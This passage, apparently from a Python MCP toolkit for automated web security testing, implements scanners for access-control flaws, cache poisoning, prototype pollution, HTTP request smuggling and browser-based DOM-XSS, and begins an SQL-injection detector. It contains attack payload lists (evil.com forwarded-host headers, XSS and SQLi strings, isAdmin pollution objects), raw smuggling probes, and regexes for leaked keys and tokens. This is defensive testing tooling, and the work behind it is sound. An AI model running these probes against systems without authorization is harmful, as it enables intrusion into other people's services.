                                    "sensitive_data_detected": True
                                },
                                "recommendation": "实施资源所有权验证，确保用户只能访问自己的资源"
                            })
                        elif content_match:
                            findings.append({
                                "type": "Potential IDOR",
                                "severity": "MEDIUM",
                                "url": test_url,
                                "description": "不同用户对同一资源ID的响应完全相同，可能存在IDOR",
                                "evidence": {
                                    "user1_status": resp1.status_code,
                                    "user2_status": resp2.status_code,
                                    "content_identical": True
                                },
                                "recommendation": "建议进一步验证资源所有权逻辑"
                            })
                
                # 垂直越权检测
                if test_type in ["all", "vertical"]:
                    # 检查URL是否包含管理/高权限路径
                    is_admin_path = any(p in test_url.lower() for p in admin_patterns)
                    
                    if is_admin_path:
                        # 如果低权限用户（user2）能访问管理接口
                        if resp2.status_code == 200:
                            findings.append({
                                "type": "Vertical Privilege Escalation",
                                "severity": "CRITICAL",
                                "url": test_url,
                                "description": "低权限用户可以访问管理接口",
                                "evidence": {
                                    "admin_path_detected": is_admin_path,
                                    "low_priv_user_status": resp2.status_code,
                                    "response_length": len(resp2.text)
                                },
                                "recommendation": "实施严格的角色权限检查（RBAC）"
                            })
                        elif resp2.status_code in [301, 302, 307, 308]:
                            # 检查是否重定向到登录页（正常行为）
                            redirect_url = resp2.headers.get("Location", "")
                            if "login" not in redirect_url.lower():
                                findings.append({
                                    "type": "Suspicious Redirect",
                                    "severity": "LOW",
                                    "url": test_url,
                                    "description": "管理接口对低权限用户返回可疑重定向",
                                    "evidence": {
                                        "redirect_to": redirect_url,
                                        "status_code": resp2.status_code
                                    }
                                })
                
                # 方法级别测试（尝试不同HTTP方法）
                for method in ["POST", "PUT", "DELETE"]:
                    try:
                        method_resp = requests.request(
                            method, test_url, headers=headers2,
                            timeout=10, verify=get_verify_ssl()
                        )
                        if method_resp.status_code not in [401, 403, 404, 405]:
                            findings.append({
                                "type": "Unsafe HTTP Method Access",
                                "severity": "HIGH",
                                "url": test_url,
                                "method": method,
                                "description": f"低权限用户可以使用 {method} 方法访问资源",
                                "evidence": {
                                    "method": method,
                                    "status_code": method_resp.status_code
                                }
                            })
                    except Exception:
                        pass
                        
            except Exception as e:
                pass  # 跳过请求失败的URL
        
        # 统计结果
        severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for f in findings:
            sev = f.get("severity", "LOW")
            if sev in severity_count:
                severity_count[sev] += 1
        
        return {
            "success": True,
            "url": url,
            "test_type": test_type,
            "tested_endpoints": tested_endpoints,
            "findings": findings,
            "total_findings": len(findings),
            "severity_summary": severity_count,
            "recommendations": [
                "实施基于角色的访问控制 (RBAC)",
                "验证资源所有权（当前用户是否有权访问该资源）",
                "对敏感操作要求二次认证",
                "记录和监控异常访问模式",
                "定期审计权限配置"
            ] if findings else []
        }

    @mcp.tool()
    def cache_poisoning_detect(url: str, aggressive: bool = False) -> dict:
        """Web缓存投毒探测 - 检测缓存行为和潜在的投毒风险
        
        默认只做探测，不执行实际投毒攻击。
        
        Args:
            url: 目标URL
            aggressive: 是否执行更激进的测试（默认False）
        
        Returns:
            探测结果，包含缓存行为分析和风险评估
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}
        
        findings = []
        cache_info = {
            "is_cached": False,
            "cache_headers": {},
            "unkeyed_headers": [],
            "unkeyed_params": [],
            "risk_level": "LOW"
        }
        
        # 检测缓存行为的头部
        cache_check_headers = [
            "Cache-Control", "Pragma", "Expires", "Age",
            "X-Cache", "X-Cache-Hits", "CF-Cache-Status",
            "X-Varnish", "X-Proxy-Cache", "Via"
        ]
        
        # 可能未键控的头部（潜在投毒点）
        unkeyed_test_headers = [
            ("X-Forwarded-Host", "evil.com"),
            ("X-Forwarded-Proto", "https"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Host", "evil.com"),
            ("X-Forwarded-Server", "evil.com"),
            ("X-HTTP-Method-Override", "DELETE"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
        ]
        
        try:
            # 第一次请求：基线
            resp1 = requests.get(url, timeout=15, verify=get_verify_ssl())
            
            # 分析缓存头
            for header in cache_check_headers:
                value = resp1.headers.get(header)
                if value:
                    cache_info["cache_headers"][header] = value
            
            # 检测是否有缓存
            if resp1.headers.get("Age") or resp1.headers.get("X-Cache"):
                cache_info["is_cached"] = True
            elif "HIT" in str(resp1.headers.get("X-Cache", "")).upper():
                cache_info["is_cached"] = True
            elif resp1.headers.get("CF-Cache-Status") in ["HIT", "DYNAMIC"]:
                cache_info["is_cached"] = True
            
            # 检测 Vary 头（影响缓存键）
            vary_header = resp1.headers.get("Vary", "")
            cache_info["vary_header"] = vary_header
            
            # 测试未键控头部
            cache_buster = f"cb{int(time.time())}"
            for header_name, test_value in unkeyed_test_headers:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}_cb={cache_buster}"
                    
                    # 发送带自定义头的请求
                    resp_with_header = requests.get(
                        test_url, 
                        headers={header_name: test_value},
                        timeout=10,
                        verify=get_verify_ssl()
                    )
                    
                    # 检查响应中是否反射了我们的值
                    if test_value in resp_with_header.text:
                        cache_info["unkeyed_headers"].append({
                            "header": header_name,
                            "value": test_value,
                            "reflected": True
                        })
                        findings.append({
                            "type": "Unkeyed Header Reflection",
                            "severity": "HIGH",
                            "header": header_name,
                            "description": f"头部 {header_name} 的值被反射到响应中，可能用于缓存投毒",
                            "evidence": f"发送 {header_name}: {test_value}，在响应中发现反射"
                        })
                        
                except Exception:
                    pass
            
            # 检测参数是否影响缓存
            if aggressive:
                test_params = ["utm_source", "utm_campaign", "ref", "_"]
                for param in test_params:
                    try:
                        test_url = f"{url}{'&' if '?' in url else '?'}{param}=test123"
                        resp_param = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                        
                        # 比较响应
                        if resp_param.headers.get("Age") and resp1.headers.get("Age"):
                            if resp_param.headers.get("Age") == resp1.headers.get("Age"):
                                cache_info["unkeyed_params"].append(param)
                    except Exception:
                        pass
            
            # 风险评估
            if cache_info["unkeyed_headers"]:
                cache_info["risk_level"] = "HIGH"
            elif cache_info["is_cached"]:
                cache_info["risk_level"] = "MEDIUM"
                findings.append({
                    "type": "Cache Detected",
                    "severity": "INFO",
                    "description": "检测到缓存机制，建议进一步评估缓存键配置"
                })
                
        except Exception as e:
            return {"success": False, "error": str(e)}
        
        return {
            "success": True,
            "url": url,
            "cache_info": cache_info,
            "findings": findings,
            "total_findings": len(findings),
            "recommendations": [
                "确保所有影响响应的头部都包含在缓存键中",
                "使用 Vary 头指定影响缓存的请求头",
                "避免在响应中反射请求头的值",
                "定期审计 CDN 和缓存配置"
            ] if findings else []
        }

    @mcp.tool()
    def prototype_pollution_detect(url: str, param: str = None) -> dict:
        """原型污染检测 - 检测客户端和服务端原型污染漏洞
        
        使用低侵入性 Payload，默认不执行破坏性操作。
        
        Args:
            url: 目标URL
            param: 可选，指定检测的参数名
        
        Returns:
            检测结果，包含发现的原型污染漏洞
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}
        
        findings = []
        
        # 客户端原型污染 Payload（查询参数）
        client_side_payloads = [
            "__proto__[polluted]=true",
            "__proto__.polluted=true",
            "constructor[prototype][polluted]=true",
            "constructor.prototype.polluted=true",
            "__proto__[testPollution]=1",
        ]
        
        # 服务端原型污染 Payload（JSON Body）
        server_side_payloads = [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}},
            {"__proto__": {"isAdmin": "true"}},
            {"__proto__": {"status": 200}},
        ]
        
        # 检测特征
        pollution_indicators = [
            "polluted", "isAdmin", "undefined", 
            "[object Object]", "prototype"
        ]
        
        test_params = [param] if param else ["data", "json", "config", "options", "settings"]
        
        # 测试客户端原型污染
        for payload in client_side_payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{payload}"
                else:
                    test_url = f"{url}?{payload}"
                
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                resp_lower = resp.text.lower()
                
                # 检查是否有异常响应
                for indicator in pollution_indicators:
                    if indicator.lower() in resp_lower:
                        # 需要二次验证，排除正常内容
                        base_resp = requests.get(url, timeout=10, verify=get_verify_ssl())
                        if indicator.lower() not in base_resp.text.lower():
                            findings.append({
                                "type": "Client-Side Prototype Pollution",
                                "severity": "MEDIUM",
                                "url": test_url,
                                "payload": payload,
                                "evidence": f"响应中出现异常指示符: {indicator}",
                                "description": "可能存在客户端原型污染，需进一步验证"
                            })
                            break
                            
            except Exception:
                pass
        
        # 测试服务端原型污染（JSON Body）
        for p in test_params:
            for payload in server_side_payloads:
                try:
                    headers = {"Content-Type": "application/json"}
                    
                    # 将污染 payload 包装到参数中
                    data = json.dumps({p: payload})
                    
                    resp = requests.post(
                        url, data=data, headers=headers,
                        timeout=10, verify=get_verify_ssl()
                    )
                    
                    # 检测响应异常
                    if resp.status_code == 200:
                        resp_lower = resp.text.lower()
                        for indicator in pollution_indicators:
                            if indicator.lower() in resp_lower:
                                findings.append({
                                    "type": "Server-Side Prototype Pollution",
                                    "severity": "HIGH",
                                    "url": url,
                                    "param": p,
                                    "payload": str(payload),
                                    "evidence": f"响应中发现可疑指示符: {indicator}",
                                    "description": "可能存在服务端原型污染"
                                })
                                break
                    
                    # 检测特权提升
                    if "admin" in resp.text.lower() or "authorized" in resp.text.lower():
                        if "__proto__" in str(payload) and "isAdmin" in str(payload):
                            findings.append({
                                "type": "Privilege Escalation via Prototype Pollution",
                                "severity": "CRITICAL",
                                "url": url,
                                "payload": str(payload),
                                "description": "可能通过原型污染实现权限提升"
                            })
                            
                except Exception:
                    pass
        
        # 统计结果
        severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for f in findings:
            sev = f.get("severity", "LOW")
            if sev in severity_count:
                severity_count[sev] += 1
        
        return {
            "success": True,
            "url": url,
            "findings": findings,
            "total_findings": len(findings),
            "severity_summary": severity_count,
            "recommendations": [
                "在递归合并对象时过滤 __proto__ 和 constructor 属性",
                "使用 Object.create(null) 创建无原型对象",
                "使用 Map 代替普通对象存储用户输入",
                "实施输入验证，拒绝包含原型污染键的请求",
                "使用 Object.freeze() 冻结关键对象"
            ] if findings else []
        }

    @mcp.tool()
    def request_smuggling_detect(
        url: str,
        method: str = "POST",
        timeout: int = 10,
        safe_mode: bool = True
    ) -> dict:
        """HTTP Request Smuggling 检测 - 检测 CL.TE、TE.CL、TE.TE 变体
        
        使用时序差异和响应差异检测请求走私漏洞。
        安全模式下只做探测，不执行实际走私攻击。
        
        Args:
            url: 目标URL
            method: HTTP方法（默认POST）
            timeout: 超时时间（秒）
            safe_mode: 安全模式，只做探测不执行攻击（默认True）
        
        Returns:
            检测结果，包含发现的漏洞和技术细节
            
        警告: 请求走私漏洞检测可能影响目标服务器。建议只在授权测试中使用。
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}
        
        from urllib.parse import urlparse
        import socket
        
        findings = []
        test_results = {
            "cl_te": {"tested": False, "vulnerable": False},
            "te_cl": {"tested": False, "vulnerable": False},
            "te_te": {"tested": False, "vulnerable": False}
        }
        
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        use_ssl = parsed.scheme == "https"
        
        def send_raw_request(raw_request: bytes, timeout_sec: int = 10) -> tuple:
            """发送原始 HTTP 请求并返回响应时间和内容"""
            try:
                # SSRF 防护: 验证目标主机
                is_safe, error_msg = validate_target_host(host, port)
                if not is_safe:
                    return -1, f"SSRF protection: {error_msg}"

                start_time = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout_sec)

                if use_ssl:
                    import ssl
                    context = ssl.create_default_context()
                    if not get_verify_ssl():
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)

                sock.connect((host, port))
                sock.sendall(raw_request)
                
                response = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                    except socket.timeout:
                        break
                
                elapsed = time.time() - start_time
                sock.close()
                return elapsed, response.decode("utf-8", errors="ignore")
                
            except Exception as e:
                return -1, str(e)
        
        # ==================== CL.TE 检测 ====================
        # 前端使用 Content-Length，后端使用 Transfer-Encoding
        if safe_mode:
            # 安全探测：发送带有冲突头部的请求，观察响应差异
            try:
                test_results["cl_te"]["tested"] = True
                
                # 正常请求基线
                normal_resp = requests.post(
                    url, data="x=1", timeout=timeout,
                    verify=get_verify_ssl()
                )
                normal_time = normal_resp.elapsed.total_seconds()
                
                # 带有冲突头部的请求（不会造成实际走私）
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Transfer-Encoding": "chunked",
                }
                # 发送格式正确的 chunked 请求
                body = "3\r\nx=1\r\n0\r\n\r\n"
                
                conflict_resp = requests.post(
                    url, data=body, headers=headers,
                    timeout=timeout, verify=get_verify_ssl()
                )
                conflict_time = conflict_resp.elapsed.total_seconds()
                
                # 检测是否接受 Transfer-Encoding
                te_supported = conflict_resp.status_code not in [400, 411, 501]
                
                if te_supported:
                    findings.append({
                        "type": "Transfer-Encoding Supported",
                        "severity": "INFO",
                        "description": "服务器接受 Transfer-Encoding: chunked",
                        "risk": "如果前后端处理不一致，可能存在请求走私风险"
                    })
                
            except Exception as e:
                test_results["cl_te"]["error"] = str(e)
        
        else:
            # 非安全模式：实际走私探测（谨慎使用！）
            try:
                test_results["cl_te"]["tested"] = True
                
                # CL.TE 时序探测
                # 如果后端使用 TE，会等待更多数据，导致超时
                cl_te_probe = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"1\r\n"
                    f"Z\r\n"
                    f"Q"  # 不完整的 chunk，会导致 TE 后端等待
                ).encode()
                
                elapsed, response = send_raw_request(cl_te_probe, timeout)
                
                if elapsed > timeout * 0.8:  # 接近超时
                    test_results["cl_te"]["vulnerable"] = True
                    findings.append({
                        "type": "CL.TE Request Smuggling",
                        "severity": "CRITICAL",
                        "description": "检测到 CL.TE 请求走私漏洞",
                        "evidence": f"响应延迟 {elapsed:.2f}s（预期超时）",
                        "recommendation": "确保前后端使用相同的请求解析逻辑"
                    })
                    
            except Exception as e:
                test_results["cl_te"]["error"] = str(e)
        
        # ==================== TE.CL 检测 ====================
        if safe_mode:
            try:
                test_results["te_cl"]["tested"] = True
                
                # 检测 Content-Length 处理
                headers = {"Content-Length": "0"}
                resp = requests.post(
                    url, data="", headers=headers,
                    timeout=timeout, verify=get_verify_ssl()
                )
                
                # 发送带有额外数据的请求
                headers2 = {"Content-Length": "5"}
                resp2 = requests.post(
                    url, data="x=1234567890",  # 超过 Content-Length
                    headers=headers2, timeout=timeout,
                    verify=get_verify_ssl()
                )
                
                if resp2.status_code == resp.status_code:
                    findings.append({
                        "type": "Content-Length Truncation",
                        "severity": "LOW",
                        "description": "服务器根据 Content-Length 截断请求体",
                        "risk": "可能与 TE 处理不一致"
                    })
                    
            except Exception as e:
                test_results["te_cl"]["error"] = str(e)
                
        else:
            try:
                test_results["te_cl"]["tested"] = True
                
                # TE.CL 探测
                te_cl_probe = (
                    f"{method} {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n"
                    f"\r\n"
                    f"X"  # 被 CL 后端解析的额外数据
                ).encode()
                
                elapsed, response = send_raw_request(te_cl_probe, timeout)
                
                if elapsed > timeout * 0.8:
                    test_results["te_cl"]["vulnerable"] = True
                    findings.append({
                        "type": "TE.CL Request Smuggling",
                        "severity": "CRITICAL",
                        "description": "检测到 TE.CL 请求走私漏洞",
                        "evidence": f"响应延迟 {elapsed:.2f}s",
                        "recommendation": "标准化前后端的请求解析"
                    })
                    
            except Exception as e:
                test_results["te_cl"]["error"] = str(e)
        
        # ==================== TE.TE 检测 ====================
        if safe_mode:
            try:
                test_results["te_te"]["tested"] = True
                
                # 测试混淆的 Transfer-Encoding 头
                te_variants = [
                    "Transfer-Encoding: chunked",
                    "Transfer-Encoding : chunked",
                    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
                    "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
                    "Transfer-encoding: chunked",
                    "Transfer-Encoding: xchunked",
                    "Transfer-Encoding: chunked\x00",
                ]
                
                for variant in te_variants:
                    try:
                        # 构建自定义请求
                        raw = (
                            f"{method} {path} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"{variant}\r\n"
                            f"\r\n"
                            f"3\r\n"
                            f"x=1\r\n"
                            f"0\r\n"
                            f"\r\n"
                        ).encode()
                        
                        elapsed, response = send_raw_request(raw, timeout // 2)
                        
                        if "200" in response or "HTTP/1.1 2" in response:
                            findings.append({
                                "type": "TE Obfuscation Accepted",
                                "severity": "MEDIUM",
                                "variant": variant.split("\r\n")[0],
                                "description": "服务器接受混淆的 Transfer-Encoding 头",
                                "risk": "如果前后端对混淆处理不同，可能存在 TE.TE 走私"
                            })
                            break
                            
                    except Exception:
                        pass
                        
            except Exception as e:
                test_results["te_te"]["error"] = str(e)
        
        # 统计结果
        severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in findings:
            sev = f.get("severity", "INFO")
            if sev in severity_count:
                severity_count[sev] += 1
        
        is_vulnerable = any([
            test_results["cl_te"].get("vulnerable"),
            test_results["te_cl"].get("vulnerable"),
            test_results["te_te"].get("vulnerable")
        ])
        
        return {
            "success": True,
            "url": url,
            "safe_mode": safe_mode,
            "is_vulnerable": is_vulnerable,
            "test_results": test_results,
            "findings": findings,
            "total_findings": len(findings),
            "severity_summary": severity_count,
            "recommendations": [
                "确保前后端使用相同的请求解析器",
                "禁用后端服务器的 Connection: keep-alive",
                "标准化 Transfer-Encoding 头的处理",
                "使用 HTTP/2 端到端（不降级到 HTTP/1.1）",
                "实施严格的请求头验证"
            ] if findings else []
        }

    # ========== Playwright 浏览器扫描（可选依赖） ==========
    # 如果 Playwright 可用，注册浏览器扫描工具
    try:
        from playwright.sync_api import sync_playwright
        HAS_PLAYWRIGHT = True
    except ImportError:
        HAS_PLAYWRIGHT = False
    
    if HAS_PLAYWRIGHT:
        @mcp.tool()
        def browser_scan(
            url: str,
            scan_type: str = "all",
            wait_time: int = 3000,
            screenshot: bool = False
        ) -> dict:
            """基于浏览器的动态安全扫描 - 使用 Playwright 执行 JavaScript
            
            支持检测需要真实浏览器环境的漏洞，如 DOM-based XSS。
            
            Args:
                url: 目标URL
                scan_type: 扫描类型 (dom_xss/js_analysis/form_discovery/all)
                wait_time: 页面加载等待时间（毫秒）
                screenshot: 是否保存截图
            
            Returns:
                扫描结果，包含发现的动态漏洞
                
            前置依赖:
                pip install playwright
                playwright install chromium
            """
            from playwright.sync_api import sync_playwright
            import hashlib
            
            findings = []
            page_info = {
                "url": url,
                "title": "",
                "forms": [],
                "event_handlers": [],
                "js_errors": [],
                "console_logs": [],
                "network_requests": []
            }
            
            # DOM-XSS Payloads
            dom_xss_payloads = [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "'-alert('XSS')-'",
                "\"><img src=x onerror=alert('XSS')>",
                "{{constructor.constructor('alert(1)')()}}",
            ]
            
            # 危险的 JS Sink 模式
            dangerous_sinks = [
                "innerHTML", "outerHTML", "document.write",
                "document.writeln", "eval(", "setTimeout(",
                "setInterval(", "Function(", ".src=",
                "location.href=", "location.assign",
                "window.open("
            ]
            
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True)
                    context = browser.new_context(
                        ignore_https_errors=True,
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AutoRedTeam-Browser/1.0"
                    )
                    page = context.new_page()
                    
                    # 收集控制台日志
                    console_logs = []
                    def on_console(msg):
                        console_logs.append({
                            "type": msg.type,
                            "text": msg.text
                        })
                    page.on("console", on_console)
                    
                    # 收集 JS 错误
                    js_errors = []
                    def on_pageerror(error):
                        js_errors.append(str(error))
                    page.on("pageerror", on_pageerror)
                    
                    # 收集网络请求
                    network_requests = []
                    def on_request(request):
                        if len(network_requests) < 100:  # 限制数量
                            network_requests.append({
                                "url": request.url,
                                "method": request.method,
                                "resource_type": request.resource_type
                            })
                    page.on("request", on_request)
                    
                    # 导航到目标页面
                    page.goto(url, wait_until="networkidle", timeout=30000)
                    page.wait_for_timeout(wait_time)
                    
                    page_info["title"] = page.title()
                    page_info["console_logs"] = console_logs
                    page_info["js_errors"] = js_errors
                    page_info["network_requests"] = network_requests[:20]  # 只返回前20个
                    
                    # ========== DOM-XSS 检测 ==========
                    if scan_type in ["all", "dom_xss"]:
                        # 检测 URL 参数注入
                        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        
                        for param_name in params:
                            for payload in dom_xss_payloads[:3]:  # 限制测试数量
                                try:
                                    test_params = params.copy()
                                    test_params[param_name] = [payload]
                                    test_query = urlencode(test_params, doseq=True)
                                    test_url = urlunparse((
                                        parsed.scheme, parsed.netloc, parsed.path,
                                        parsed.params, test_query, parsed.fragment
                                    ))
                                    
                                    # 创建新页面测试
                                    test_page = context.new_page()
                                    
                                    # 设置对话框处理器检测 alert
                                    alert_triggered = []
                                    def on_dialog(dialog):
                                        alert_triggered.append(dialog.message)
                                        dialog.dismiss()
                                    test_page.on("dialog", on_dialog)
                                    
                                    test_page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                                    test_page.wait_for_timeout(1000)
                                    
                                    if alert_triggered:
                                        findings.append({
                                            "type": "DOM-based XSS",
                                            "severity": "HIGH",
                                            "param": param_name,
                                            "payload": payload,
                                            "url": test_url,
                                            "evidence": f"Alert 触发: {alert_triggered[0]}",
                                            "description": "通过 URL 参数触发了 DOM-XSS"
                                        })
                                    
                                    test_page.close()
                                    
                                except Exception as e:
                                    pass
                        
                        # 检测 hash fragment 注入
                        for payload in dom_xss_payloads[:2]:
                            try:
                                test_url = f"{url}#{payload}"
                                test_page = context.new_page()
                                
                                alert_triggered = []
                                def on_dialog(dialog):
                                    alert_triggered.append(dialog.message)
                                    dialog.dismiss()
                                test_page.on("dialog", on_dialog)
                                
                                test_page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                                test_page.wait_for_timeout(1000)
                                
                                if alert_triggered:
                                    findings.append({
                                        "type": "DOM-based XSS (Fragment)",
                                        "severity": "HIGH",
                                        "payload": payload,
                                        "url": test_url,
                                        "evidence": f"Hash fragment 触发 Alert",
                                        "description": "页面处理 location.hash 时存在 XSS"
                                    })
                                
                                test_page.close()
                                
                            except Exception:
                                pass
                    
                    # ========== JavaScript 分析 ==========
                    if scan_type in ["all", "js_analysis"]:
                        # 获取页面所有脚本内容
                        scripts = page.evaluate("""
                            () => {
                                const scripts = [];
                                document.querySelectorAll('script').forEach(s => {
                                    if (s.src) {
                                        scripts.push({type: 'external', src: s.src});
                                    } else if (s.textContent) {
                                        scripts.push({type: 'inline', content: s.textContent.substring(0, 500)});
                                    }
                                });
                                return scripts;
                            }
                        """)
                        
                        # 检测危险 Sink
                        for script in scripts:
                            if script.get("type") == "inline":
                                content = script.get("content", "")
                                for sink in dangerous_sinks:
                                    if sink in content:
                                        findings.append({
                                            "type": "Dangerous JS Sink",
                                            "severity": "MEDIUM",
                                            "sink": sink,
                                            "context": content[:100] + "...",
                                            "description": f"发现使用危险的 JavaScript Sink: {sink}"
                                        })
                                        break  # 每个脚本只报告一次
                        
                        # 检测事件处理器
                        event_handlers = page.evaluate("""
                            () => {
                                const handlers = [];
                                const elements = document.querySelectorAll('*');
                                elements.forEach(el => {
                                    const attrs = el.attributes;
                                    for (let i = 0; i < attrs.length; i++) {
                                        if (attrs[i].name.startsWith('on')) {
                                            handlers.push({
                                                tag: el.tagName,
                                                event: attrs[i].name,
                                                handler: attrs[i].value.substring(0, 100)
                                            });
                                        }
                                    }
                                });
                                return handlers.slice(0, 20);
                            }
                        """)
                        
                        page_info["event_handlers"] = event_handlers
                        
                        # 检测敏感信息泄露
                        page_content = page.content()
                        sensitive_patterns = [
                            ("API Key", r'["\']?api[_-]?key["\']?\s*[:=]\s*["\'][a-zA-Z0-9]{20,}["\']'),
                            ("AWS Key", r'AKIA[0-9A-Z]{16}'),
                            ("Private Key", r'-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----'),
                            ("JWT Token", r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'),
                        ]
                        
                        import re
                        for name, pattern in sensitive_patterns:
                            if re.search(pattern, page_content):
                                findings.append({
                                    "type": "Sensitive Data Exposure",
                                    "severity": "HIGH",
                                    "data_type": name,
                                    "description": f"页面内容中发现疑似 {name} 泄露"
                                })
                    
                    # ========== 表单发现 ==========
                    if scan_type in ["all", "form_discovery"]:
                        forms = page.evaluate("""
                            () => {
                                const forms = [];
                                document.querySelectorAll('form').forEach(form => {
                                    const inputs = [];
                                    form.querySelectorAll('input, textarea, select').forEach(input => {
                                        inputs.push({
                                            name: input.name || input.id,
                                            type: input.type || input.tagName.toLowerCase(),
                                            value: input.value || ''
                                        });
                                    });
                                    forms.push({
                                        action: form.action,
                                        method: form.method || 'GET',
                                        inputs: inputs
                                    });
                                });
                                return forms;
                            }
                        """)
                        
                        page_info["forms"] = forms
                        
                        # 检测不安全的表单
                        for form in forms:
                            # 检测明文密码提交
                            if form.get("method", "").upper() == "GET":
                                for input_field in form.get("inputs", []):
                                    if input_field.get("type") == "password":
                                        findings.append({
                                            "type": "Insecure Form",
                                            "severity": "HIGH",
                                            "form_action": form.get("action"),
                                            "description": "密码字段使用 GET 方法提交，可能泄露在 URL 中"
                                        })
                            
                            # 检测 HTTPS 页面提交到 HTTP
                            action = form.get("action", "")
                            if url.startswith("https://") and action.startswith("http://"):
                                findings.append({
                                    "type": "Mixed Content Form",
                                    "severity": "MEDIUM",
                                    "form_action": action,
                                    "description": "HTTPS 页面的表单提交到 HTTP 地址"
                                })
                    
                    # 保存截图
                    screenshot_path = None
                    if screenshot:
                        import os
                        screenshot_dir = os.path.join(os.path.dirname(__file__), "..", "data", "screenshots")
                        os.makedirs(screenshot_dir, exist_ok=True)
                        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
                        screenshot_path = os.path.join(screenshot_dir, f"scan_{url_hash}.png")
                        page.screenshot(path=screenshot_path)
                    
                    browser.close()
                    
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "hint": "确保已安装 Playwright: pip install playwright && playwright install chromium"
                }
            
            # 统计结果
            severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
            for f in findings:
                sev = f.get("severity", "LOW")
                if sev in severity_count:
                    severity_count[sev] += 1
            
            return {
                "success": True,
                "url": url,
                "scan_type": scan_type,
                "page_info": page_info,
                "findings": findings,
                "total_findings": len(findings),
                "severity_summary": severity_count,
                "screenshot_path": screenshot_path,
                "recommendations": [
                    "对所有用户输入进行严格的输出编码",
                    "使用 Content-Security-Policy 限制内联脚本执行",
                    "避免使用 eval()、innerHTML 等危险函数",
                    "对敏感数据使用服务端渲染，避免暴露在客户端",
                    "所有表单应使用 HTTPS 和 POST 方法"
                ] if findings else []
            }
        
        # 添加到工具列表
        return [
            "vuln_check", "sqli_detect", "xss_detect", "csrf_detect", "ssrf_detect",
            "cmd_inject_detect", "xxe_detect", "idor_detect", "file_upload_detect",
            "auth_bypass_detect", "logic_vuln_check", "deserialize_detect",
            "weak_password_detect", "security_headers_check", "jwt_vuln_detect",
            "ssti_detect", "lfi_detect", "waf_detect", "cors_deep_check", 
            "nosql_detect", "access_control_test", 
            "cache_poisoning_detect", "prototype_pollution_detect",
            "request_smuggling_detect", "browser_scan"
        ]
    
    # Playwright 不可用时的返回
    return [
        "vuln_check", "sqli_detect", "xss_detect", "csrf_detect", "ssrf_detect",
        "cmd_inject_detect", "xxe_detect", "idor_detect", "file_upload_detect",
        "auth_bypass_detect", "logic_vuln_check", "deserialize_detect",
        "weak_password_detect", "security_headers_check", "jwt_vuln_detect",
        "ssti_detect", "lfi_detect", "waf_detect", "cors_deep_check", 
        "nosql_detect", "access_control_test", 
        "cache_poisoning_detect", "prototype_pollution_detect",
        "request_smuggling_detect"
    ]


# ============ 独立顶层函数（可直接导入） ============
# 这些函数封装了 register_vuln_tools() 内部的功能，供其他模块使用

def sqli_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
    """SQL注入检测 - 独立顶层函数
    
    可通过 from tools.vuln_tools import sqli_detect 直接导入使用
    """
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    error_payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--"]
    error_patterns = [
        "sql syntax", "mysql", "sqlite", "postgresql", "oracle", "sqlserver",
        "syntax error", "unclosed quotation", "quoted string not properly terminated",
        "warning: mysql", "valid mysql result", "mysqlclient", "mysqli",
        "pg_query", "pg_exec", "ora-", "microsoft ole db provider for sql server"
    ]
    
    base_url = url
    test_params = [param] if param else ["id", "page", "cat", "search", "q", "query", "user", "name"]
    
    # 获取基线响应
    try:
